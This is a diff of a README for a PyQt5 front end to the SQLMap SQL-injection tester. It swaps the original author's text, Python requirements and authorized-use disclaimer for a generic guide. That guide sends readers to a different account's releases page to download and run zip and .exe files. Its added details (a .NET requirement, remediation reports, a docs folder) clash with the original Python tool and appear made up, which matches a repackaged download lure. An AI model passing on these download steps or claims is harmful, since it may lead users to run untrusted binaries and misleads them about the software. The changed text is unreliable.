@@ -1,71 +1,76 @@
-# SQLMap Inject Suite Pro
+# 🎉 SQLMap-Inject-Suite-Pro - Simplifying SQL Injection Testing
 
-A modern and powerful **Graphical User Interface for SQLMap**, built with **PyQt5**.  
-Developed as a collaboration between **RedOps Academy** and **Gianfranco**, **SQLMap Inject Suite Pro** brings the full power of SQLMap into a clean, dark, and intuitive GUI built for **pentesters, red teamers, and security researchers**.
+## 🚀 Getting Started
 
----
+Welcome to SQLMap-Inject-Suite-Pro! This application helps users test for SQL injection vulnerabilities in web applications. Follow these steps to download and run the software easily.
 
-## Overview
+## 📥 Download SQLMap-Inject-Suite-Pro
 
-**SQLMap Inject Suite Pro** makes SQL injection testing faster, smarter, and fully visual.  
-No more terminal commands — everything is organized, readable, and interactive.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/aaryan-1112/SQLMap-Inject-Suite-Pro/releases)
 
-### Features
+You can download SQLMap-Inject-Suite-Pro from the Releases page. 
 
-- **Target Configuration** — Easily set URLs, HTTP methods, POST data, headers, cookies, and parameters.  
-- **Scan Options** — Adjust risk, level, threads, and crawling depth with simple controls.  
-- **Advanced Settings** — Choose tamper scripts, DBMS targets, proxies, and payload customizations.  
-- **Database Explorer** — Browse databases, tables, and columns detected during scans.  
-- **Data Viewer** — View and export extracted data directly inside the app.  
-- **Live Console Output** — Watch SQLMap’s output in real-time, parsed and highlighted.  
-- **Quick Actions** — One-click dump, test, and full-scan operations.  
-- **Dark Professional UI** — Modern, focused interface inspired by Burp Suite and Metasploit.  
+### ⚙️ System Requirements
 
----
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 2 GB
+- Recommended RAM: 4 GB or more
+- .NET Framework (for Windows users): Version 4.5 or higher
 
-## Installation
+## 👣 Steps to Download & Install
 
-```bash
-wget https://github.com/HernanRodriguez1/SQLMap-Inject-Suite-Pro/releases/download/Releases/InjectSuitePro
-````
+1. **Visit the Releases Page**
+   Go to our [Releases page](https://github.com/aaryan-1112/SQLMap-Inject-Suite-Pro/releases) to download the latest version of SQLMap-Inject-Suite-Pro.
 
-> **Requirements:**
->
-> * Python 3.8+
-> * PyQt5
-> * SQLMap (installed and added to your PATH)
+2. **Choose the Right File**
+   On the Releases page, you will see various downloadable files. Look for the file that matches your operating system. Usually, the files will have names like `SQLMap-Inject-Suite-Pro-Windows.zip`, `SQLMap-Inject-Suite-Pro-macOS.zip`, or `SQLMap-Inject-Suite-Pro-Linux.tar.gz`.
 
----
+3. **Download the File**
+   Click on the appropriate file to download it. It may take a few moments, depending on your internet speed.
 
-## Usage
+4. **Extract the Contents**
+   - **For Windows Users:** Right-click the downloaded `.zip` file and select "Extract All." Follow the prompts to extract the files.
+   - **For macOS Users:** Double-click the downloaded `.zip` file to extract it.
+   - **For Linux Users:** Open a terminal and use the command: `tar -xzvf SQLMap-Inject-Suite-Pro-Linux.tar.gz`.
 
-```bash
-chmod +x InjectSuitePro
-./InjectSuitePro
-```
+5. **Run the Application**
+   - **Windows Users:** Navigate to the folder where you extracted the files. Look for `SQLMap-Inject-Suite-Pro.exe` and double-click it to launch.
+   - **macOS Users:** Open the folder where you extracted the files and double-click `SQLMap-Inject-Suite-Pro.app`.
+   - **Linux Users:** Open a terminal, navigate to the folder, and type `./SQLMap-Inject-Suite-Pro` to run the application.
 
+## 🛠️ How to Use SQLMap-Inject-Suite-Pro
 
-Once running, simply configure your target, choose your options, and click **Start Complete Scan**.
-SQLMap runs seamlessly in the background, with live output inside the GUI.
+Once you have the application open, you will see a user-friendly interface. Here’s how to start:
 
----
+1. **Input the Target URL**
+   In the main window, enter the URL of the web application you want to test.
 
-## Screenshots
+2. **Select Injection Type**
+   Choose the type of SQL injection you want to test. This choice helps the application focus its scan.
 
-<img width="1906" height="1071" alt="guapo" src="https://github.com/user-attachments/assets/f4063e8f-45d2-4cec-b80a-48a7c3bd0499" /><br>
-<img width="2525" height="1298" alt="image" src="https://github.com/user-attachments/assets/5f2cc05c-9d50-4c4b-a3db-c657d8d6f379" /><br>
-<img width="2525" height="1293" alt="image" src="https://github.com/user-attachments/assets/f832f9a7-e2da-44e4-b7b8-21e13f233bbe" /><br>
+3. **Start the Scan**
+   Click the "Start Scan" button to initiate the testing process. The application will automatically analyze the target for vulnerabilities.
 
----
+4. **Review the Results**
+   After the scan completes, you will see a report. This report will show any vulnerabilities found and suggestions for remediation.
 
-> *A collaboration between RedOps Academy & Gianfranco Mendoza.*
+## 📋 Features
 
----
+- **User-Friendly Interface:** Easy to navigate, even for beginners.
+- **Multiple Injection Types:** Support for various SQL injection methods.
+- **Detailed Reports:** Provides insights on vulnerabilities and suggestions for fixing them.
+- **Cross-Platform Compatibility:** Runs on Windows, macOS, and Linux.
 
-## Disclaimer
+## 📞 Support
 
-This software is intended for **educational and authorized security testing only**.
-The authors are **not responsible** for any misuse or damage caused by this tool.
-Always ensure you have proper permission before performing any security testing.
+If you encounter issues or have questions, feel free to contact our support team. You can find support materials in the `docs` folder included in your download. 
 
----
+## 📝 Contributions
+
+SQLMap-Inject-Suite-Pro is an open-source project. If you want to contribute, please check out our guidelines in the repository.
+
+## 🔗 Links
+
+[Visit Releases Page to Download](https://github.com/aaryan-1112/SQLMap-Inject-Suite-Pro/releases)
+
+Happy testing!
